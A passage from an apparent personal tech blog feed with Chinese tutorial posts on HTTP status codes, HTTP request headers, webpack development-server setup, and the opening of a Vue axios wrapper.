Error</h2><p>表明服务器端在执行请求时发生了错误，也有可能时Web应用存在的bug或某些临时的故障</p><h2 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h2><p>表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入Retry-After首部字段再返回给客户端。</p><p>状态码和状况不一致：</p><p>不少返回的状态码响应都是错误的，但是用户可能察觉不到这点，比如Web应用程序内部发生错误，状态码依然返回200 OK。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;状态码作用：&quot;&gt;&lt;a href=&quot;#状态码作用：&quot; class=&quot;headerlink&quot; title=&quot;状态码作用：&quot;&gt;&lt;/a&gt;状态码作用：&lt;/h1&gt;&lt;p&gt;状态码的职责是当客户端向服务器发送请求时，描述返回的请求结果，借助状态码，用户可以知道服务器时正常处理了请求</summary>
      
    
    
    
    <category term="http" scheme="https://coloey.github.io/categories/http/"/>
    
    
  </entry>
  
  <entry>
    <title>http请求首部字段</title>
    <link href="https://coloey.github.io/2022/04/11/http%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/"/>
    <id>https://coloey.github.io/2022/04/11/http%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/</id>
    <published>2022-04-11T11:53:59.000Z</published>
    <updated>2022-04-12T14:34:10.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h1><blockquote><p>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</p></blockquote><p>Accept首部字段通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可用type/subtype这种形式，一次指定多种媒体类型。</p><p>文本文件：text/html,text/plain,text/css…</p><p>application/xhtml+xml,application/xml…</p><p>图片文件：image/jpg,image/gif…</p><p>视频文件：video/mpeg,video/quicktime…</p><p>应用程序使用的二进制文件：application/octet-stream,application/zip…</p><p>若想给显示的媒体类型增加优先级，使用q=来额外表示权重值，用分号（；）进行分隔，权重值q范围是0~1,（可精确到小数点后3位，且1为最大值。不指定权重值q时，默认权重为q=1.0</p><p>当服务器提供多种内容时，将首先返回权重值最高的媒体类型。</p><h1 id="Accept-Charset"><a href="#Accept-Charset" class="headerlink" title="Accept-Charset"></a>Accept-Charset</h1><blockquote><p>Accept-Charset:iso-8859-5,unicode-1-1;q=0.8</p></blockquote><p>Accept-Charset首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与各首部字段Accept相同的是可用权重q值来表示相对优先级</p><p>该首部字段用于内容协商机制的服务器驱动协商。</p><h1 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h1><blockquote><p>Accept-Encoding:gzip,deflate</p></blockquote><p>Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。</p><p>gzip:由文件压缩程序gzip（GNU zip)生成的编码格式，采用LZ77及32为循环冗余校验</p><p>compress:由UNIX文件压缩程序compress生成的编码格式，采用的算法LZW</p><p>deflate:组合使用zlib格式及由deflate压缩算法生成的编码格式</p><p>identity:不执行压缩或不会变化的默认编码格式</p><p>采用权值q来表示相对优先级，这点与首部字段Accept相同。可用(*)作为通配符，指定任意编码格式</p><h1 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h1><p>告知服务器用户代理能够处理的自然语言集，以及自然语言集的相对优先级。可一次指定多种自然语言集</p><p>按权重q表示相对优先级。</p><h1 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h1><p>首部字段Authorization用来告知服务器，用户代理的认证信息，通常想要通过服务器认证的用户代理会在接收待返回的401状态码后，把首部字段Authorization加入到请求中。共用缓存在接收到含有Authorization首部字段的请求时的操作处理会略有差异。</p><h1 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h1><blockquote><p>Expect:100-continue</p></blockquote><p>客户端使用首部字段Expect来告知服务器，期望出现的某种特定行为，因服务器无法理解客户端的期望做出回应而发生错误时，会返回417Expectation Failed</p><p>客户端可以利用该首部字段，写明所期望的扩展。虽然HTTP/1.1规范只定义100-continue(状态码100Continue之意)</p><h1 id="From"><a href="#From" class="headerlink" title="From"></a>From</h1><p>首部字段From用来告知服务器使用用户代理的用户的电子邮件地址。通常使用目的是为了显示搜索引擎用户代理的负责人的电子邮件联系方式。使用代理时，尽可能包含From首部字段</p><h1 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h1><p>首部字段Host会告知服务器，请求的资源所处的互联网主机名和端口号。Host首部字段再HTTP/1.1规范内是唯一一个必须被包含在请求内的首部字段。</p><p>请求被发送到服务器时，请求中的主机名会用IP地址直接替换解决，但如果这时相同的IP地址下部署运行着多个域名，那么服务器就无法理解是哪个域名对应的请求。因此，就要使用首部字段Host来明确指出请求的主机名，若服务器未设定主机名，那直接发送空值。</p><p>Host:</p><h1 id="If-Match"><a href="#If-Match" class="headerlink" title="If-Match"></a>If-Match</h1><p>if-xxx为条件请求，服务器接收到附带条件请求后，只有判断指定条件为真，才执行请求。</p><p>首部字段If-Match，属于附带条件之一，它会告知服务器匹配资源所用的实体标记(ETag)值，这时的服务器无法使用弱ETag值，服务器对比If-Match的字段值与资源的ETag值，仅当两者一致时才执行请求，否则，返回状态码412 Precondition Failed</p><p>还可以使用(*)指定If-Match的字段值，针对这种情况，服务器会忽略ETag的值，只要资源存在就处理请求。</p><h1 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h1><blockquote><p>If-Modified-Since: Thu,15 Apr 2004 00:00:00 GMT</p></blockquote><p>首部字段If-Modified-Since属于附带条件之一，它会告知服务器若If-Modified-Since字段值早于资源的更新时间，则希望能处理该请求，而在If-Modified-Since字段值的日期时间后，如果请求的资源都没有更新，返回状态码304Not Modified的响应</p><p>If-Modified-Since用于确认代理或客户端拥有的本地资源的有效性，获取资源的更新时间可通过确认首部字段Last-Modified确定</p><h1 id="If-None-Match"><a href="#If-None-Match" class="headerlink" title="If-None-Match"></a>If-None-Match</h1><p>与If-Match作用相反，用于指定If-None-Match字段值的实体标记（ETag)值与请求资源得到ETag不一致时会告知服务器处理该请求。</p><p>在GET或HEAD方法中使用首部字段If-None-Match可获取最新的源，因此这与使用首部字段If-Modified-Since有些类似。</p><h1 id="If-Range"><a href="#If-Range" class="headerlink" title="If-Range"></a>If-Range</h1><p>If-Range字段值若是和ETag值或更新的日期时间匹配一致，那么就作为范围请求处理，<strong>若不一致返回全部资源</strong></p><p>如果不使用If-Range,而是使用If-Match,服务器端的资源如果更新了，那客户端持有的资源中的一部分也会随之无效，服务器端就会以<strong>402 Precondition Failed</strong>返回，催促客户端再次发请求，与使用If-Range相比，就要花费两倍的功夫。</p><h1 id="If-Unmodified-Since"><a href="#If-Unmodified-Since" class="headerlink" title="If-Unmodified-Since"></a>If-Unmodified-Since</h1><p>与If-Modified-Since作用相反，它的作用是告知服务器，指定的资源只有在字段值内指定的日期时间之后未发生更新得情况下，才能处理请求，如果在指定日期时间后发生了更新，则以状态码412 Precondition Failed作为响应返回</p><h1 id="Max-Forwards"><a href="#Max-Forwards" class="headerlink" title="Max-Forwards"></a>Max-Forwards</h1><p>通过TRACE方法或OPTIONS方法，发送包含首部字段Max-Forwards的请求时，该字段以十进制整数的形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求前，Max-Forwards的值减1后重新复制，当服务器收到Max-Forwards值为0的请求时则不再进行转发，而是直接返回响应。</p><p>如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Accept&quot;&gt;&lt;a href=&quot;#Accept&quot; class=&quot;headerlink&quot; title=&quot;Accept&quot;&gt;&lt;/a&gt;Accept&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Accept:text/html,application/xhtml+xml,ap</summary>
      
    
    
    
    <category term="http" scheme="https://coloey.github.io/categories/http/"/>
    
    
  </entry>
  
  <entry>
    <title>开发环境</title>
    <link href="https://coloey.github.io/2022/04/11/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    <id>https://coloey.github.io/2022/04/11/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</id>
    <published>2022-04-11T06:51:43.000Z</published>
    <updated>2022-04-11T11:53:09.615Z</updated>
    
    <content type="html"><![CDATA[<h1 id="开发环境中使用source-map"><a href="#开发环境中使用source-map" class="headerlink" title="开发环境中使用source map"></a>开发环境中使用source map</h1><p>当 webpack 打包源代码时，可能会很难追踪到 error(错误) 和 warning(警告) 在源代码中的原始位置。例如，如果将三个源文件（<code>a.js</code>, <code>b.js</code> 和 <code>c.js</code>）打包到一个 bundle（<code>bundle.js</code>）中，而其中一个源文件包含一个错误，那么堆栈跟踪就会直接指向到 <code>bundle.js</code>。你可能需要准确地知道错误来自于哪个源文件，所以这种提示这通常不会提供太多帮助。</p><p>为了更容易地追踪 error 和 warning，JavaScript 提供了 <a href="http://blog.teamtreehouse.com/introduction-source-maps">source maps</a> 功能，可以将编译后的代码映射回原始源代码。如果一个错误来自于 <code>b.js</code>，source map 就会明确的告诉你。</p><p>source map 有许多 <a href="https://webpack.docschina.org/configuration/devtool">可用选项</a>，请务必仔细阅读它们，以便可以根据需要进行配置。</p><p>对于本指南，我们将使用 <code>inline-source-map</code> 选项，这有助于解释说明示例意图（此配置仅用于示例，不要用于生产环境）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path=<span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin=<span class="built_in">require</span>(<span class="string">&quot;html-webpack-plugin&quot;</span>)</span><br><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    <span class="attr">entry</span>:&#123;</span><br><span class="line">       <span class="attr">index</span>: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">       <span class="attr">print</span>:<span class="string">&#x27;./src/print.js&#x27;</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">output</span>:&#123;</span><br><span class="line">        <span class="attr">filename</span>:<span class="string">&#x27;[name]bundle.js&#x27;</span>,</span><br><span class="line">        <span class="attr">path</span>:path.resolve(__dirname,<span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">        <span class="attr">clean</span>:<span class="literal">true</span>,</span><br><span class="line">        <span class="attr">publicPath</span>:<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">module</span>:&#123;</span><br><span class="line">        <span class="attr">rules</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">                use:[<span class="string">&#x27;style-loader&#x27;</span>,<span class="string">&#x27;css-loader&#x27;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>:<span class="regexp">/\.(png|jpg|jpeg|svg|gif)$/i</span>,</span><br><span class="line">                type:<span class="string">&#x27;asset/resource&#x27;</span></span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            </span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">devtool</span>:<span class="string">&#x27;inline-source-map&#x27;</span>,</span><br><span class="line">    <span class="attr">devServer</span>:&#123;</span><br><span class="line">        <span class="attr">static</span>:<span class="string">&#x27;./dist&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">plugins</span>:[</span><br><span class="line">        <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">            <span class="attr">title</span>:<span class="string">&#x27;Development&#x27;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">mode</span>:<span class="string">&#x27;development&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="选择开发工具"><a href="#选择开发工具" class="headerlink" title="选择开发工具"></a>选择开发工具</h1><p>webpack 提供几种可选方式，帮助你在代码发生变化后自动编译代码：</p><ol><li>webpack’s <a href="https://webpack.docschina.org/configuration/watch/#watch">Watch Mode</a></li><li><a href="https://github.com/webpack/webpack-dev-server">webpack-dev-server</a></li><li><a href="https://github.com/webpack/webpack-dev-middleware">webpack-dev-middleware</a></li></ol><p>多数场景中，你可能需要使用 <code>webpack-dev-server</code>，但是不妨探讨一下以上的所有选项。</p><h2 id="使用watch-mode"><a href="#使用watch-mode" class="headerlink" title="使用watch mode"></a>使用watch mode</h2><p>你可以指示 webpack “watch” 依赖图中所有文件的更改。如果其中一个文件被更新，代码将被重新编译，所以你不必再去手动运行整个构建。</p><p>我们添加一个用于启动 webpack watch mode 的 npm scripts：</p><p><strong>package.json</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;name&quot;: &quot;webpack-demo&quot;,</span><br><span class="line">   &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">   &quot;description&quot;: &quot;&quot;,</span><br><span class="line">   &quot;private&quot;: true,</span><br><span class="line">   &quot;scripts&quot;: &#123;</span><br><span class="line">     &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;,</span><br><span class="line"><span class="addition">+    &quot;watch&quot;: &quot;webpack --watch&quot;,</span></span><br><span class="line">     &quot;build&quot;: &quot;webpack&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;keywords&quot;: [],</span><br><span class="line">   &quot;author&quot;: &quot;&quot;,</span><br><span class="line">   &quot;license&quot;: &quot;ISC&quot;,</span><br><span class="line">   &quot;devDependencies&quot;: &#123;</span><br><span class="line">     &quot;html-webpack-plugin&quot;: &quot;^4.5.0&quot;,</span><br><span class="line">     &quot;webpack&quot;: &quot;^5.4.0&quot;,</span><br><span class="line">     &quot;webpack-cli&quot;: &quot;^4.2.0&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;dependencies&quot;: &#123;</span><br><span class="line">     &quot;lodash&quot;: &quot;^4.17.20&quot;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>现在，你可以在命令行中运行 <code>npm run watch</code>，然后就会看到 webpack 是如何编译代码。</p><p>唯一的缺点是，为了看到修改后的实际效果，<strong>你需要刷新浏览器</strong>。如果能够自动刷新浏览器就更好了，因此接下来我们会尝试通过 <code>webpack-dev-server</code> 实现此功能。</p><h2 id="webpack-dev-server"><a href="#webpack-dev-server" class="headerlink" title="webpack-dev-server"></a>webpack-dev-server</h2><p><code>webpack-dev-server</code> 为你提供了一个基本的 web server，并且具有 live reloading(实时重新加载) 功能。设置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev webpack-dev-server</span><br></pre></td></tr></table></figure><p>修改配置文件，告知 dev server，从什么位置查找文件：</p><p><strong>webpack.config.js</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> const path = require(&#x27;path&#x27;);</span><br><span class="line"> const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);</span><br><span class="line"></span><br><span class="line"> module.exports = &#123;</span><br><span class="line">   mode: &#x27;development&#x27;,</span><br><span class="line">   entry: &#123;</span><br><span class="line">     index: &#x27;./src/index.js&#x27;,</span><br><span class="line">     print: &#x27;./src/print.js&#x27;,</span><br><span class="line">   &#125;,</span><br><span class="line">   devtool: &#x27;inline-source-map&#x27;,</span><br><span class="line"><span class="addition">+  devServer: &#123;</span></span><br><span class="line"><span class="addition">+    static: &#x27;./dist&#x27;,</span></span><br><span class="line"><span class="addition">+  &#125;,</span></span><br><span class="line">   plugins: [</span><br><span class="line">     new HtmlWebpackPlugin(&#123;</span><br><span class="line">       title: &#x27;Development&#x27;,</span><br><span class="line">     &#125;),</span><br><span class="line">   ],</span><br><span class="line">   output: &#123;</span><br><span class="line">     filename: &#x27;[name].bundle.js&#x27;,</span><br><span class="line">     path: path.resolve(__dirname, &#x27;dist&#x27;),</span><br><span class="line">     clean: true,</span><br><span class="line">   &#125;,</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>以上配置告知 <code>webpack-dev-server</code>，将 <code>dist</code> 目录下的文件 serve 到 <code>localhost:8080</code> 下。（译注：serve，将资源作为 server 的可访问文件）</p><p>我们添加一个可以直接运行 dev server 的 script：</p><p><strong>package.json</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">     &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;,</span><br><span class="line">     &quot;watch&quot;: &quot;webpack --watch&quot;,</span><br><span class="line"><span class="addition">+    &quot;start&quot;: &quot;webpack serve --open&quot;,</span></span><br><span class="line">     &quot;build&quot;: &quot;webpack&quot;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>现在，在命令行中运行 <code>npm start</code>，我们会看到浏览器自动加载页面。如果你更改任何源文件并保存它们，web server 将在编译代码后自动重新加载</p><h2 id="webpack-dev-middleware"><a href="#webpack-dev-middleware" class="headerlink" title="webpack-dev-middleware"></a>webpack-dev-middleware</h2><p><code>webpack-dev-middleware</code> 是一个封装器(wrapper)，它可以把 webpack 处理过的文件发送到一个 server。<code>webpack-dev-server</code> 在内部使用了它，然而它也可以作为一个单独的 package 来使用，以便根据需求进行更多自定义设置。下面是一个 webpack-dev-middleware 配合 express server 的示例。</p><p>首先，安装 <code>express</code> 和 <code>webpack-dev-middleware</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev express webpack-dev-middleware</span><br></pre></td></tr></table></figure><p>调整webpack.config,js</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> const path = require(&#x27;path&#x27;);</span><br><span class="line"> const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);</span><br><span class="line"></span><br><span class="line"> module.exports = &#123;</span><br><span class="line">   mode: &#x27;development&#x27;,</span><br><span class="line">   entry: &#123;</span><br><span class="line">     index: &#x27;./src/index.js&#x27;,</span><br><span class="line">     print: &#x27;./src/print.js&#x27;,</span><br><span class="line">   &#125;,</span><br><span class="line">   devtool: &#x27;inline-source-map&#x27;,</span><br><span class="line">   devServer: &#123;</span><br><span class="line">     static: &#x27;./dist&#x27;,</span><br><span class="line">   &#125;,</span><br><span class="line">   plugins: [</span><br><span class="line">     new HtmlWebpackPlugin(&#123;</span><br><span class="line">       title: &#x27;Development&#x27;,</span><br><span class="line">     &#125;),</span><br><span class="line">   ],</span><br><span class="line">   output: &#123;</span><br><span class="line">     filename: &#x27;[name].bundle.js&#x27;,</span><br><span class="line">     path: path.resolve(__dirname, &#x27;dist&#x27;),</span><br><span class="line">     clean: true,</span><br><span class="line"><span class="addition">+    publicPath: &#x27;/&#x27;,</span></span><br><span class="line">   &#125;,</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>我们将会在 server 脚本使用 <code>publicPath</code>，以确保文件资源能够正确地 serve 在 <code>http://localhost:3000</code> 下，稍后我们会指定 port number(端口号)。接下来是设置自定义 <code>express</code> server：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> webpack-demo</span><br><span class="line">  |- package.json</span><br><span class="line">  |- package-lock.json</span><br><span class="line">  |- webpack.config.js</span><br><span class="line"><span class="addition">+ |- server.js</span></span><br><span class="line">  |- /dist</span><br><span class="line">  |- /src</span><br><span class="line">    |- index.js</span><br><span class="line">    |- print.js</span><br><span class="line">  |- /node_modules</span><br></pre></td></tr></table></figure><p><strong>server.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> webpackDevMiddleware = <span class="built_in">require</span>(<span class="string">&#x27;webpack-dev-middleware&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">&#x27;./webpack.config.js&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> compiler = webpack(config);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 告知 express 使用 webpack-dev-middleware，</span></span><br><span class="line"><span class="comment">// 以及将 webpack.config.js 配置文件作为基础配置。</span></span><br><span class="line">app.use(</span><br><span class="line">  webpackDevMiddleware(compiler, &#123;</span><br><span class="line">    <span class="attr">publicPath</span>: config.output.publicPath,</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将文件 serve 到 port 3000。</span></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Example app listening on port 3000!\n&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>现在，添加一个 npm script，以使我们更方便地运行 server：</p><p>package.json</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &quot;scripts&quot;: &#123;</span><br><span class="line">     &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;,</span><br><span class="line">     &quot;watch&quot;: &quot;webpack --watch&quot;,</span><br><span class="line">     &quot;start&quot;: &quot;webpack serve --open&quot;,</span><br><span class="line"><span class="addition">+    &quot;server&quot;: &quot;node server.js&quot;,</span></span><br><span class="line">     &quot;build&quot;: &quot;webpack&quot;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>现在，在 terminal(终端) 中执行 <code>npm run server</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;开发环境中使用source-map&quot;&gt;&lt;a href=&quot;#开发环境中使用source-map&quot; class=&quot;headerlink&quot; title=&quot;开发环境中使用source map&quot;&gt;&lt;/a&gt;开发环境中使用source map&lt;/h1&gt;&lt;p&gt;当 webpack </summary>
      
    
    
    
    <category term="webpack" scheme="https://coloey.github.io/categories/webpack/"/>
    
    
  </entry>
  
  <entry>
    <title>Vue中封装axios请求</title>
    <link href="https://coloey.github.io/2022/04/11/Vue%E4%B8%AD%E5%B0%81%E8%A3%85axios%E8%AF%B7%E6%B1%82/"/>
    <id>https://coloey.github.io/2022/04/11/Vue%E4%B8%AD%E5%B0%81%E8%A3%85axios%E8%AF%B7%E6%B1%82/</id>
    <published>2022-04-11T02:01:47.000Z</published>
    <updated>2022-04-11T02:24:02.431Z</updated>
    
    <content type="html"><![CDATA[<p>在src文件夹中新创建一个utils文件夹，创建index.js来实现axios实例，并配置拦截器</p><h2 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;ElLoading,ElMessage&#125; <span class="keyword">from</span> <span class="string">&#x27;element-plus&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&quot;../router&quot;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;../store&quot;</span></span><br><span class="line"><span class="keyword">import</span> CHAT <span class="keyword">from</span> <span class="string">&quot;../client&quot;</span></span><br><span class="line"><span class="comment">//const 